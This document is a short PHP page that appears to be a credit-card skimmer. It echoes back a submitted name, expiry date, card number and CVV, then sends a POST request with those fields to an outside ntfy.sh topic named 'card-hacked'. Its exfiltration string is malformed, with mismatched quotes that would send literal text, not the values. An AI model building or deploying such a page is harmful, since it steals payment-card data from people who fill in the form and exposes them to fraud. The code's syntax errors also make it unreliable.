<html>
<body>
<p>You're lucky, we didn't find it. Your card details:</p>
<?php echo $_POST["name"]; ?>
<?php echo $_POST["exp"]; ?>
<?php echo $_POST["ccnumber"]; ?>
<?php echo $_POST["ccv"]; ?>
<?php file_get_contents('https://ntfy.sh/card-hacked', false, stream_context_create([
    'http' => [
        'method' => 'POST', // PUT also works
        'header' => 'Content-Type: text/plain',
        'content' => '$_POST["name], $_POST["exp"], $_POST["ccnumber"], echo $_POST["ccv"]'
    ]
])); ?>

</body>
</html>
